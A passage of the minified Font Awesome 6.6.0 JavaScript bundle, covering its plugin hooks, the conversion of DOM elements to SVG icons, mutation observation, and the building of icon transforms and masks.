    }
    ),
    mh.forEach(r => {
        const a = r.mixout ? r.mixout() : {};
        if (Object.keys(a).forEach(o => {
            typeof a[o] == "function" && (n[o] = a[o]),
            typeof a[o] == "object" && Object.keys(a[o]).forEach(i => {
                n[o] || (n[o] = {}),
                n[o][i] = a[o][i]
            }
            )
        }
        ),
        r.hooks) {
            const o = r.hooks();
            Object.keys(o).forEach(i => {
                Aa[i] || (Aa[i] = []),
                Aa[i].push(o[i])
            }
            )
        }
        r.provides && r.provides(Ba)
    }
    ),
    n
}
function Ac(e, t) {
    for (var n = arguments.length, r = new Array(n > 2 ? n - 2 : 0), a = 2; a < n; a++)
        r[a - 2] = arguments[a];
    return (Aa[e] || []).forEach(i => {
        t = i.apply(null, [t, ...r])
    }
    ),
    t
}
function ca(e) {
    for (var t = arguments.length, n = new Array(t > 1 ? t - 1 : 0), r = 1; r < t; r++)
        n[r - 1] = arguments[r];
    (Aa[e] || []).forEach(o => {
        o.apply(null, n)
    }
    )
}
function Or() {
    const e = arguments[0]
      , t = Array.prototype.slice.call(arguments, 1);
    return Ba[e] ? Ba[e].apply(null, t) : void 0
}
function Lc(e) {
    e.prefix === "fa" && (e.prefix = "fas");
    let {iconName: t} = e;
    const n = e.prefix || Pr();
    if (t)
        return t = vr(n, t) || t,
        ph(v1.definitions, n, t) || ph(Mn.styles, n, t)
}
const v1 = new $4
  , W4 = () => {
    fe.autoReplaceSvg = !1,
    fe.observeMutations = !1,
    ca("noAuto")
}
  , K4 = {
    i2svg: function() {
        let e = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {};
        return nr ? (ca("beforeI2svg", e),
        Or("pseudoElements2svg", e),
        Or("i2svg", e)) : Promise.reject(new Error("Operation requires a DOM of some kind."))
    },
    watch: function() {
        let e = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {};
        const {autoReplaceSvgRoot: t} = e;
        fe.autoReplaceSvg === !1 && (fe.autoReplaceSvg = !0),
        fe.observeMutations = !0,
        O4( () => {
            Y4({
                autoReplaceSvgRoot: t
            }),
            ca("watch", e)
        }
        )
    }
}
  , G4 = {
    icon: e => {
        if (e === null)
            return null;
        if (typeof e == "object" && e.prefix && e.iconName)
            return {
                prefix: e.prefix,
                iconName: vr(e.prefix, e.iconName) || e.iconName
            };
        if (Array.isArray(e) && e.length === 2) {
            const t = e[1].indexOf("fa-") === 0 ? e[1].slice(3) : e[1]
              , n = Tl(e[0]);
            return {
                prefix: n,
                iconName: vr(n, t) || t
            }
        }
        if (typeof e == "string" && (e.indexOf("".concat(fe.cssPrefix, "-")) > -1 || e.match(g4))) {
            const t = Pl(e.split(" "), {
                skipLookups: !0
            });
            return {
                prefix: t.prefix || Pr(),
                iconName: vr(t.prefix, t.iconName) || t.iconName
            }
        }
        if (typeof e == "string") {
            const t = Pr();
            return {
                prefix: t,
                iconName: vr(t, e) || e
            }
        }
    }
}
  , hn = {
    noAuto: W4,
    config: fe,
    dom: K4,
    parse: G4,
    library: v1,
    findIconDefinition: Lc,
    toHtml: Ni
}
  , Y4 = function() {
    let e = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {};
    const {autoReplaceSvgRoot: t=lt} = e;
    (Object.keys(Mn.styles).length > 0 || fe.autoFetchSvg) && nr && fe.autoReplaceSvg && hn.dom.i2svg({
        node: t
    })
};
function Ol(e, t) {
    return Object.defineProperty(e, "abstract", {
        get: t
    }),
    Object.defineProperty(e, "html", {
        get: function() {
            return e.abstract.map(n => Ni(n))
        }
    }),
    Object.defineProperty(e, "node", {
        get: function() {
            if (!nr)
                return;
            const n = lt.createElement("div");
            return n.innerHTML = e.html,
            n.children
        }
    }),
    e
}
function Q4(e) {
    let {children: t, main: n, mask: r, attributes: a, styles: o, transform: i} = e;
    if (td(i) && n.found && !r.found) {
        const {width: s, height: u} = n
          , c = {
            x: s / u / 2,
            y: .5
        };
        a.style = _l({
            ...o,
            "transform-origin": "".concat(c.x + i.x / 16, "em ").concat(c.y + i.y / 16, "em")
        })
    }
    return [{
        tag: "svg",
        attributes: a,
        children: t
    }]
}
function X4(e) {
    let {prefix: t, iconName: n, children: r, attributes: a, symbol: o} = e;
    const i = o === !0 ? "".concat(t, "-").concat(fe.cssPrefix, "-").concat(n) : o;
    return [{
        tag: "svg",
        attributes: {
            style: "display: none;"
        },
        children: [{
            tag: "symbol",
            attributes: {
                ...a,
                id: i
            },
            children: r
        }]
    }]
}
function od(e) {
    const {icons: {main: t, mask: n}, prefix: r, iconName: a, transform: o, symbol: i, title: s, maskId: u, titleId: c, extra: f, watchable: d=!1} = e
      , {width: h, height: N} = n.found ? n : t
      , y = r === "fak"
      , S = [fe.replacementClass, a ? "".concat(fe.cssPrefix, "-").concat(a) : ""].filter(k => f.classes.indexOf(k) === -1).filter(k => k !== "" || !!k).concat(f.classes).join(" ");
    let x = {
        children: [],
        attributes: {
            ...f.attributes,
            "data-prefix": r,
            "data-icon": a,
            class: S,
            role: f.attributes.role || "img",
            xmlns: "http://www.w3.org/2000/svg",
            viewBox: "0 0 ".concat(h, " ").concat(N)
        }
    };
    const g = y && !~f.classes.indexOf("fa-fw") ? {
        width: "".concat(h / N * 16 * .0625, "em")
    } : {};
    d && (x.attributes[ua] = ""),
    s && (x.children.push({
        tag: "title",
        attributes: {
            id: x.attributes["aria-labelledby"] || "title-".concat(c || pi())
        },
        children: [s]
    }),
    delete x.attributes.title);
    const p = {
        ...x,
        prefix: r,
        iconName: a,
        main: t,
        mask: n,
        maskId: u,
        transform: o,
        symbol: i,
        styles: {
            ...g,
            ...f.styles
        }
    }
      , {children: m, attributes: C} = n.found && t.found ? Or("generateAbstractMask", p) || {
        children: [],
        attributes: {}
    } : Or("generateAbstractIcon", p) || {
        children: [],
        attributes: {}
    };
    return p.children = m,
    p.attributes = C,
    i ? X4(p) : Q4(p)
}
function gh(e) {
    const {content: t, width: n, height: r, transform: a, title: o, extra: i, watchable: s=!1} = e
      , u = {
        ...i.attributes,
        ...o ? {
            title: o
        } : {},
        class: i.classes.join(" ")
    };
    s && (u[ua] = "");
    const c = {
        ...i.styles
    };
    td(a) && (c.transform = _4({
        transform: a,
        startCentered: !0,
        width: n,
        height: r
    }),
    c["-webkit-transform"] = c.transform);
    const f = _l(c);
    f.length > 0 && (u.style = f);
    const d = [];
    return d.push({
        tag: "span",
        attributes: u,
        children: [t]
    }),
    o && d.push({
        tag: "span",
        attributes: {
            class: "sr-only"
        },
        children: [o]
    }),
    d
}
function q4(e) {
    const {content: t, title: n, extra: r} = e
      , a = {
        ...r.attributes,
        ...n ? {
            title: n
        } : {},
        class: r.classes.join(" ")
    }
      , o = _l(r.styles);
    o.length > 0 && (a.style = o);
    const i = [];
    return i.push({
        tag: "span",
        attributes: a,
        children: [t]
    }),
    n && i.push({
        tag: "span",
        attributes: {
            class: "sr-only"
        },
        children: [n]
    }),
    i
}
const {styles: vu} = Mn;
function Ic(e) {
    const t = e[0]
      , n = e[1]
      , [r] = e.slice(4);
    let a = null;
    return Array.isArray(r) ? a = {
        tag: "g",
        attributes: {
            class: "".concat(fe.cssPrefix, "-").concat(mu.GROUP)
        },
        children: [{
            tag: "path",
            attributes: {
                class: "".concat(fe.cssPrefix, "-").concat(mu.SECONDARY),
                fill: "currentColor",
                d: r[0]
            }
        }, {
            tag: "path",
            attributes: {
                class: "".concat(fe.cssPrefix, "-").concat(mu.PRIMARY),
                fill: "currentColor",
                d: r[1]
            }
        }]
    } : a = {
        tag: "path",
        attributes: {
            fill: "currentColor",
            d: r
        }
    },
    {
        found: !0,
        width: t,
        height: n,
        icon: a
    }
}
const J4 = {
    found: !1,
    width: 512,
    height: 512
};
function Z4(e, t) {
    !n1 && !fe.showMissingIcons && e && console.error('Icon with name "'.concat(e, '" and prefix "').concat(t, '" is missing.'))
}
function Mc(e, t) {
    let n = t;
    return t === "fa" && fe.styleDefault !== null && (t = Pr()),
    new Promise( (r, a) => {
        if (n === "fa") {
            const o = y1(e) || {};
            e = o.iconName || e,
            t = o.prefix || t
        }
        if (e && t && vu[t] && vu[t][e]) {
            const o = vu[t][e];
            return r(Ic(o))
        }
        Z4(e, t),
        r({
            ...J4,
            icon: fe.showMissingIcons && e ? Or("missingIconAbstract") || {} : {}
        })
    }
    )
}
const yh = () => {}
  , Dc = fe.measurePerformance && Zi && Zi.mark && Zi.measure ? Zi : {
    mark: yh,
    measure: yh
}
  , Ro = 'FA "6.6.0"'
  , e3 = e => (Dc.mark("".concat(Ro, " ").concat(e, " begins")),
() => x1(e))
  , x1 = e => {
    Dc.mark("".concat(Ro, " ").concat(e, " ends")),
    Dc.measure("".concat(Ro, " ").concat(e), "".concat(Ro, " ").concat(e, " begins"), "".concat(Ro, " ").concat(e, " ends"))
}
;
var id = {
    begin: e3,
    end: x1
};
const gs = () => {}
;
function vh(e) {
    return typeof (e.getAttribute ? e.getAttribute(ua) : null) == "string"
}
function t3(e) {
    const t = e.getAttribute ? e.getAttribute(Jf) : null
      , n = e.getAttribute ? e.getAttribute(Zf) : null;
    return t && n
}
function n3(e) {
    return e && e.classList && e.classList.contains && e.classList.contains(fe.replacementClass)
}
function r3() {
    return fe.autoReplaceSvg === !0 ? ys.replace : ys[fe.autoReplaceSvg] || ys.replace
}
function a3(e) {
    return lt.createElementNS("http://www.w3.org/2000/svg", e)
}
function o3(e) {
    return lt.createElement(e)
}
function w1(e) {
    let t = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
    const {ceFn: n=e.tag === "svg" ? a3 : o3} = t;
    if (typeof e == "string")
        return lt.createTextNode(e);
    const r = n(e.tag);
    return Object.keys(e.attributes || []).forEach(function(o) {
        r.setAttribute(o, e.attributes[o])
    }),
    (e.children || []).forEach(function(o) {
        r.appendChild(w1(o, {
            ceFn: n
        }))
    }),
    r
}
function i3(e) {
    let t = " ".concat(e.outerHTML, " ");
    return t = "".concat(t, "Font Awesome fontawesome.com "),
    t
}
const ys = {
    replace: function(e) {
        const t = e[0];
        if (t.parentNode)
            if (e[1].forEach(n => {
                t.parentNode.insertBefore(w1(n), t)
            }
            ),
            t.getAttribute(ua) === null && fe.keepOriginalSource) {
                let n = lt.createComment(i3(t));
                t.parentNode.replaceChild(n, t)
            } else
                t.remove()
    },
    nest: function(e) {
        const t = e[0]
          , n = e[1];
        if (~ed(t).indexOf(fe.replacementClass))
            return ys.replace(e);
        const r = new RegExp("".concat(fe.cssPrefix, "-.*"));
        if (delete n[0].attributes.id,
        n[0].attributes.class) {
            const o = n[0].attributes.class.split(" ").reduce( (i, s) => (s === fe.replacementClass || s.match(r) ? i.toSvg.push(s) : i.toNode.push(s),
            i), {
                toNode: [],
                toSvg: []
            });
            n[0].attributes.class = o.toSvg.join(" "),
            o.toNode.length === 0 ? t.removeAttribute("class") : t.setAttribute("class", o.toNode.join(" "))
        }
        const a = n.map(o => Ni(o)).join(`
`);
        t.setAttribute(ua, ""),
        t.innerHTML = a
    }
};
function xh(e) {
    e()
}
function b1(e, t) {
    const n = typeof t == "function" ? t : gs;
    if (e.length === 0)
        n();
    else {
        let r = xh;
        fe.mutateApproach === p4 && (r = Tr.requestAnimationFrame || xh),
        r( () => {
            const a = r3()
              , o = id.begin("mutate");
            e.map(a),
            o(),
            n()
        }
        )
    }
}
let sd = !1;
function S1() {
    sd = !0
}
function zc() {
    sd = !1
}
let Zs = null;
function wh(e) {
    if (!lh || !fe.observeMutations)
        return;
    const {treeCallback: t=gs, nodeCallback: n=gs, pseudoElementsCallback: r=gs, observeMutationsRoot: a=lt} = e;
    Zs = new lh(o => {
        if (sd)
            return;
        const i = Pr();
        io(o).forEach(s => {
            if (s.type === "childList" && s.addedNodes.length > 0 && !vh(s.addedNodes[0]) && (fe.searchPseudoElements && r(s.target),
            t(s.target)),
            s.type === "attributes" && s.target.parentNode && fe.searchPseudoElements && r(s.target.parentNode),
            s.type === "attributes" && vh(s.target) && ~x4.indexOf(s.attributeName))
                if (s.attributeName === "class" && t3(s.target)) {
                    const {prefix: u, iconName: c} = Pl(ed(s.target));
                    s.target.setAttribute(Jf, u || i),
                    c && s.target.setAttribute(Zf, c)
                } else
                    n3(s.target) && n(s.target)
        }
        )
    }
    ),
    nr && Zs.observe(a, {
        childList: !0,
        attributes: !0,
        characterData: !0,
        subtree: !0
    })
}
function s3() {
    Zs && Zs.disconnect()
}
function l3(e) {
    const t = e.getAttribute("style");
    let n = [];
    return t && (n = t.split(";").reduce( (r, a) => {
        const o = a.split(":")
          , i = o[0]
          , s = o.slice(1);
        return i && s.length > 0 && (r[i] = s.join(":").trim()),
        r
    }
    , {})),
    n
}
function u3(e) {
    const t = e.getAttribute("data-prefix")
      , n = e.getAttribute("data-icon")
      , r = e.innerText !== void 0 ? e.innerText.trim() : "";
    let a = Pl(ed(e));
    return a.prefix || (a.prefix = Pr()),
    t && n && (a.prefix = t,
    a.iconName = n),
    a.iconName && a.prefix || (a.prefix && r.length > 0 && (a.iconName = F4(a.prefix, e.innerText) || rd(a.prefix, Oc(e.innerText))),
    !a.iconName && fe.autoFetchSvg && e.firstChild && e.firstChild.nodeType === Node.TEXT_NODE && (a.iconName = e.firstChild.data)),
    a
}
function c3(e) {
    const t = io(e.attributes).reduce( (a, o) => (a.name !== "class" && a.name !== "style" && (a[o.name] = o.value),
    a), {})
      , n = e.getAttribute("title")
      , r = e.getAttribute("data-fa-title-id");
    return fe.autoA11y && (n ? t["aria-labelledby"] = "".concat(fe.replacementClass, "-title-").concat(r || pi()) : (t["aria-hidden"] = "true",
    t.focusable = "false")),
    t
}
function f3() {
    return {
        iconName: null,
        title: null,
        titleId: null,
        prefix: null,
        transform: In,
        symbol: !1,
        mask: {
            iconName: null,
            prefix: null,
            rest: []
        },
        maskId: null,
        extra: {
            classes: [],
            styles: {},
            attributes: {}
        }
    }
}
function bh(e) {
    let t = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {
        styleParser: !0
    };
    const {iconName: n, prefix: r, rest: a} = u3(e)
      , o = c3(e)
      , i = Ac("parseNodeAttributes", {}, e);
    let s = t.styleParser ? l3(e) : [];
    return {
        iconName: n,
        title: e.getAttribute("title"),
        titleId: e.getAttribute("data-fa-title-id"),
        prefix: r,
        transform: In,
        mask: {
            iconName: null,
            prefix: null,
            rest: []
        },
        maskId: null,
        symbol: !1,
        extra: {
            classes: a,
            styles: s,
            attributes: o
        },
        ...i
    }
}
const {styles: d3} = Mn;
function N1(e) {
    const t = fe.autoReplaceSvg === "nest" ? bh(e, {
        styleParser: !1
    }) : bh(e);
    return ~t.extra.classes.indexOf(o1) ? Or("generateLayersText", e, t) : Or("generateSvgReplacementMutation", e, t)
}
let Fn = new Set;
r1.map(e => {
    Fn.add("fa-".concat(e))
}
);
Object.keys(ea[ht]).map(Fn.add.bind(Fn));
Object.keys(ea[un]).map(Fn.add.bind(Fn));
Object.keys(ea[cn]).map(Fn.add.bind(Fn));
Fn = [...Fn];
function Sh(e) {
    let t = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : null;
    if (!nr)
        return Promise.resolve();
    const n = lt.documentElement.classList
      , r = f => n.add("".concat(fh, "-").concat(f))
      , a = f => n.remove("".concat(fh, "-").concat(f))
      , o = fe.autoFetchSvg ? Fn : r1.map(f => "fa-".concat(f)).concat(Object.keys(d3));
    o.includes("fa") || o.push("fa");
    const i = [".".concat(o1, ":not([").concat(ua, "])")].concat(o.map(f => ".".concat(f, ":not([").concat(ua, "])"))).join(", ");
    if (i.length === 0)
        return Promise.resolve();
    let s = [];
    try {
        s = io(e.querySelectorAll(i))
    } catch {}
    if (s.length > 0)
        r("pending"),
        a("complete");
    else
        return Promise.resolve();
    const u = id.begin("onTree")
      , c = s.reduce( (f, d) => {
        try {
            const h = N1(d);
            h && f.push(h)
        } catch (h) {
            n1 || h.name === "MissingIcon" && console.error(h)
        }
        return f
    }
    , []);
    return new Promise( (f, d) => {
        Promise.all(c).then(h => {
            b1(h, () => {
                r("active"),
                r("complete"),
                a("pending"),
                typeof t == "function" && t(),
                u(),
                f()
            }
            )
        }
        ).catch(h => {
            u(),
            d(h)
        }
        )
    }
    )
}
function p3(e) {
    let t = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : null;
    N1(e).then(n => {
        n && b1([n], t)
    }
    )
}
function h3(e) {
    return function(t) {
        let n = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
        const r = (t || {}).icon ? t : Lc(t || {});
        let {mask: a} = n;
        return a && (a = (a || {}).icon ? a : Lc(a || {})),
        e(r, {
            ...n,
            mask: a
        })
    }
}
const m3 = function(e) {
    let t = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
    const {transform: n=In, symbol: r=!1, mask: a=null, maskId: o=null, title: i=null, titleId: s=null, classes: u=[], attributes: c={}, styles: f={}} = t;
    if (!e)
        return;
    const {prefix: d, iconName: h, icon: N} = e;
    return Ol({
        type: "icon",
        ...e
    }, () => (ca("beforeDOMElementCreation", {
        iconDefinition: e,
        params: t
    }),
    fe.autoA11y && (i ? c["aria-labelledby"] = "".concat(fe.replacementClass, "-title-").concat(s || pi()) : (c["aria-hidden"] = "true",
    c.focusable = "false")),
    od({
        icons: {
            main: Ic(N),
            mask: a ? Ic(a.icon) : {
                found: !1,
                width: null,
                height: null,
                icon: {}
            }
        },
        prefix: d,
        iconName: h,
        transform: {
            ...In,
            ...n
        },
        symbol: r,
        title: i,
        maskId: o,
        titleId: s,
        extra: {
            attributes: c,
            styles: f,
            classes: u
        }
    })))
};
var g3 = {
    mixout() {
        return {
            icon: h3(m3)
        }
    },
    hooks() {
        return {
            mutationObserverCallbacks(e) {
                return e.treeCallback = Sh,
                e.nodeCallback = p3,
                e
            }
        }
    },
    provides(e) {
        e.i2svg = function(t) {
            const {node: n=lt, callback: r= () => {}
            } = t;
            return Sh(n, r)
        }
        ,
        e.generateSvgReplacementMutation = function(t, n) {
            const {iconName: r, title: a, titleId: o, prefix: i, transform: s, symbol: u, mask: c, maskId: f, extra: d} = n;
            return new Promise( (h, N) => {
                Promise.all([Mc(r, i), c.iconName ? Mc(c.iconName, c.prefix) : Promise.resolve({
                    found: !1,
                    width: 512,
                    height: 512,
                    icon: {}
                })]).then(y => {
                    let[S,x] = y;
                    h([t, od({
                        icons: {
                            main: S,
                            mask: x
                        },
                        prefix: i,
                        iconName: r,
                        transform: s,
                        symbol: u,
                        maskId: f,
                        title: a,
                        titleId: o,
                        extra: d,
                        watchable: !0
                    })])
                }
                ).catch(N)
            }
            )
        }
        ,
        e.generateAbstractIcon = function(t) {
            let {children: n, attributes: r, main: a, transform: o, styles: i} = t;
            const s = _l(i);
            s.length > 0 && (r.style = s);
            let u;
            return td(o) && (u = Or("generateAbstractTransformGrouping", {
                main: a,
                transform: o,
                containerWidth: a.width,
                iconWidth: a.width
            })),
            n.push(u || a.icon),
            {
                children: n,
                attributes: r
            }
        }
    }
}
  , y3 = {
    mixout() {
        return {
            layer(e) {
                let t = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
                const {classes: n=[]} = t;
                return Ol({
                    type: "layer"
                }, () => {
                    ca("beforeDOMElementCreation", {
                        assembler: e,
                        params: t
                    });
                    let r = [];
                    return e(a => {
                        Array.isArray(a) ? a.map(o => {
                            r = r.concat(o.abstract)
                        }
                        ) : r = r.concat(a.abstract)
                    }
                    ),
                    [{
                        tag: "span",
                        attributes: {
                            class: ["".concat(fe.cssPrefix, "-layers"), ...n].join(" ")
                        },
                        children: r
                    }]
                }
                )
            }
        }
    }
}
  , v3 = {
    mixout() {
        return {
            counter(e) {
                let t = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
                const {title: n=null, classes: r=[], attributes: a={}, styles: o={}} = t;
                return Ol({
                    type: "counter",
                    content: e
                }, () => (ca("beforeDOMElementCreation", {
                    content: e,
                    params: t
                }),
                q4({
                    content: e.toString(),
                    title: n,
                    extra: {
                        attributes: a,
                        styles: o,
                        classes: ["".concat(fe.cssPrefix, "-layers-counter"), ...r]
                    }
                })))
            }
        }
    }
}
  , x3 = {
    mixout() {
        return {
            text(e) {
                let t = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
                const {transform: n=In, title: r=null, classes: a=[], attributes: o={}, styles: i={}} = t;
                return Ol({
                    type: "text",
                    content: e
                }, () => (ca("beforeDOMElementCreation", {
                    content: e,
                    params: t
                }),
                gh({
                    content: e,
                    transform: {
                        ...In,
                        ...n
                    },
                    title: r,
                    extra: {
                        attributes: o,
                        styles: i,
                        classes: ["".concat(fe.cssPrefix, "-layers-text"), ...a]
                    }
                })))
            }
        }
    },
    provides(e) {
        e.generateLayersText = function(t, n) {
            const {title: r, transform: a, extra: o} = n;
            let i = null
              , s = null;
            if (Xg) {
                const u = parseInt(getComputedStyle(t).fontSize, 10)
                  , c = t.getBoundingClientRect();
                i = c.width / u,
                s = c.height / u
            }
            return fe.autoA11y && !r && (o.attributes["aria-hidden"] = "true"),
            Promise.resolve([t, gh({
                content: t.innerHTML,
                width: i,
                height: s,
                transform: a,
                title: r,
                extra: o,
                watchable: !0
            })])
        }
    }
};
const w3 = new RegExp('"',"ug")
  , Nh = [1105920, 1112319]
  , Ch = {
    FontAwesome: {
        normal: "fas",
        400: "fas"
    },
    ...t4,
    ...e4,
    ...u4
}
  , Fc = Object.keys(Ch).reduce( (e, t) => (e[t.toLowerCase()] = Ch[t],
e), {})
  , b3 = Object.keys(Fc).reduce( (e, t) => {
    const n = Fc[t];
    return e[t] = n[900] || [...Object.entries(n)][0][1],
    e
}
, {});
function S3(e) {
    const t = e.replace(w3, "")
      , n = A4(t, 0)
      , r = n >= Nh[0] && n <= Nh[1]
      , a = t.length === 2 ? t[0] === t[1] : !1;
    return {
        value: Oc(a ? t[0] : t),
        isSecondary: r || a
    }
}
function N3(e, t) {
    const n = e.replace(/^['"]|['"]$/g, "").toLowerCase()
      , r = parseInt(t)
      , a = isNaN(r) ? "normal" : r;
    return (Fc[n] || {})[a] || b3[n]
}
function kh(e, t) {
    const n = "".concat(d4).concat(t.replace(":", "-"));
    return new Promise( (r, a) => {
        if (e.getAttribute(n) !== null)
            return r();
        const i = io(e.children).filter(h => h.getAttribute(Ec) === t)[0]
          , s = Tr.getComputedStyle(e, t)
          , u = s.getPropertyValue("font-family")
          , c = u.match(y4)
          , f = s.getPropertyValue("font-weight")
          , d = s.getPropertyValue("content");
        if (i && !c)
            return e.removeChild(i),
            r();
        if (c && d !== "none" && d !== "") {
            const h = s.getPropertyValue("content");
            let N = N3(u, f);
            const {value: y, isSecondary: S} = S3(h)
              , x = c[0].startsWith("FontAwesome");
            let g = rd(N, y)
              , p = g;
            if (x) {
                const m = U4(y);
                m.iconName && m.prefix && (g = m.iconName,
                N = m.prefix)
            }
            if (g && !S && (!i || i.getAttribute(Jf) !== N || i.getAttribute(Zf) !== p)) {
                e.setAttribute(n, p),
                i && e.removeChild(i);
                const m = f3()
                  , {extra: C} = m;
                C.attributes[Ec] = t,
                Mc(g, N).then(k => {
                    const w = od({
                        ...m,
                        icons: {
                            main: k,
                            mask: ad()
                        },
                        prefix: N,
                        iconName: p,
                        extra: C,
                        watchable: !0
                    })
                      , A = lt.createElementNS("http://www.w3.org/2000/svg", "svg");
                    t === "::before" ? e.insertBefore(A, e.firstChild) : e.appendChild(A),
                    A.outerHTML = w.map(P => Ni(P)).join(`
`),
                    e.removeAttribute(n),
                    r()
                }
                ).catch(a)
            } else
                r()
        } else
            r()
    }
    )
}
function C3(e) {
    return Promise.all([kh(e, "::before"), kh(e, "::after")])
}
function k3(e) {
    return e.parentNode !== document.head && !~h4.indexOf(e.tagName.toUpperCase()) && !e.getAttribute(Ec) && (!e.parentNode || e.parentNode.tagName !== "svg")
}
function jh(e) {
    if (nr)
        return new Promise( (t, n) => {
            const r = io(e.querySelectorAll("*")).filter(k3).map(C3)
              , a = id.begin("searchPseudoElements");
            S1(),
            Promise.all(r).then( () => {
                a(),
                zc(),
                t()
            }
            ).catch( () => {
                a(),
                zc(),
                n()
            }
            )
        }
        )
}
var j3 = {
    hooks() {
        return {
            mutationObserverCallbacks(e) {
                return e.pseudoElementsCallback = jh,
                e
            }
        }
    },
    provides(e) {
        e.pseudoElements2svg = function(t) {
            const {node: n=lt} = t;
            fe.searchPseudoElements && jh(n)
        }
    }
};
let Eh = !1;
var E3 = {
    mixout() {
        return {
            dom: {
                unwatch() {
                    S1(),
                    Eh = !0
                }
            }
        }
    },
    hooks() {
        return {
            bootstrap() {
                wh(Ac("mutationObserverCallbacks", {}))
            },
            noAuto() {
                s3()
            },
            watch(e) {
                const {observeMutationsRoot: t} = e;
                Eh ? zc() : wh(Ac("mutationObserverCallbacks", {
                    observeMutationsRoot: t
                }))
            }
        }
    }
};
const _h = e => {
    let t = {
        size: 16,
        x: 0,
        y: 0,
        flipX: !1,
        flipY: !1,
        rotate: 0
    };
    return e.toLowerCase().split(" ").reduce( (n, r) => {
        const a = r.toLowerCase().split("-")
          , o = a[0];
        let i = a.slice(1).join("-");
        if (o && i === "h")
            return n.flipX = !0,
            n;
        if (o && i === "v")
            return n.flipY = !0,
            n;
        if (i = parseFloat(i),
        isNaN(i))
            return n;
        switch (o) {
        case "grow":
            n.size = n.size + i;
            break;
        case "shrink":
            n.size = n.size - i;
            break;
        case "left":
            n.x = n.x - i;
            break;
        case "right":
            n.x = n.x + i;
            break;
        case "up":
            n.y = n.y - i;
            break;
        case "down":
            n.y = n.y + i;
            break;
        case "rotate":
            n.rotate = n.rotate + i;
            break
        }
        return n
    }
    , t)
}
;
var _3 = {
    mixout() {
        return {
            parse: {
                transform: e => _h(e)
            }
        }
    },
    hooks() {
        return {
            parseNodeAttributes(e, t) {
                const n = t.getAttribute("data-fa-transform");
                return n && (e.transform = _h(n)),
                e
            }
        }
    },
    provides(e) {
        e.generateAbstractTransformGrouping = function(t) {
            let {main: n, transform: r, containerWidth: a, iconWidth: o} = t;
            const i = {
                transform: "translate(".concat(a / 2, " 256)")
            }
              , s = "translate(".concat(r.x * 32, ", ").concat(r.y * 32, ") ")
              , u = "scale(".concat(r.size / 16 * (r.flipX ? -1 : 1), ", ").concat(r.size / 16 * (r.flipY ? -1 : 1), ") ")
              , c = "rotate(".concat(r.rotate, " 0 0)")
              , f = {
                transform: "".concat(s, " ").concat(u, " ").concat(c)
            }
              , d = {
                transform: "translate(".concat(o / 2 * -1, " -256)")
            }
              , h = {
                outer: i,
                inner: f,
                path: d
            };
            return {
                tag: "g",
                attributes: {
                    ...h.outer
                },
                children: [{
                    tag: "g",
                    attributes: {
                        ...h.inner
                    },
                    children: [{
                        tag: n.icon.tag,
                        children: n.icon.children,
                        attributes: {
                            ...n.icon.attributes,
                            ...h.path
                        }
                    }]
                }]
            }
        }
    }
};
const xu = {
    x: 0,
    y: 0,
    width: "100%",
    height: "100%"
};
function Th(e) {
    let t = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : !0;
    return e.attributes && (e.attributes.fill || t) && (e.attributes.fill = "black"),
    e
}
function T3(e) {
    return e.tag === "g" ? e.children : [e]
}
var P3 = {
    hooks() {
        return {
            parseNodeAttributes(e, t) {
                const n = t.getAttribute("data-fa-mask")
                  , r = n ? Pl(n.split(" ").map(a => a.trim())) : ad();
                return r.prefix || (r.prefix = Pr()),
                e.mask = r,
                e.maskId = t.getAttribute("data-fa-mask-id"),
                e
            }
        }
    },
    provides(e) {
        e.generateAbstractMask = function(t) {
            let {children: n, attributes: r, main: a, mask: o, maskId: i, transform: s} = t;
            const {width: u, icon: c} = a
              , {width: f, icon: d} = o
              , h = E4({
                transform: s,
                containerWidth: f,
                iconWidth: u
            })
              , N = {
                tag: "rect",
                attributes: {
                    ...xu,
                    fill: "white"
                }
            }
              , y = c.children ? {
                children: c.children.map(Th)
            } : {}
              , S = {
                tag: "g",
                attributes: {
                    ...h.inner
                },
                children: [Th({
                    tag: c.tag,
                    attributes: {
                        ...c.attributes,
                        ...h.path
                    },
                    ...y
                })]
            }
              , x = {
                tag: "g",
                attributes: {
                    ...h.outer
                },
                children: [S]
            }
              , g = "mask-".concat(i || pi())
              , p = "clip-".concat(i || pi())
              , m = {
                tag: "mask",
                attributes: {
                    ...xu,
                    id: g,
                    maskUnits: "userSpaceOnUse",
                    maskContentUnits: "userSpaceOnUse"
                },
                children: [N, x]
            }
              , C = {
                tag: "defs",
                children: [{
                    tag: "clipPath",
                    attributes: {
                        id: p
                    },
                    children: T3(d)
                }, m]
            };
            return n.push(C, {
                tag: "rect",
                attributes: {
                    fill: "currentColor",
                    "clip-path": "url(#".concat(p, ")"),
                    mask: "url(#".concat(g, ")"),
                    ...xu
                }
            }),
            {
                children: n,
                attributes: r
            }
        }
    }
}
  , O3 = {
    provides(e) {
        let t = !1;
        Tr.matchMedia && (t = Tr.matchMedia("(prefers-reduced-motion: reduce)").matches),
        e.missingIconAbstract = function() {
            const n = []
              , r = {
                fill: "currentColor"
            }
              , a = {
                attributeType: "XML",
                repeatCount: "indefinite",
                dur: "2s"
            };
            n.push({
                tag: "path",
                attributes: {
                    ...r,
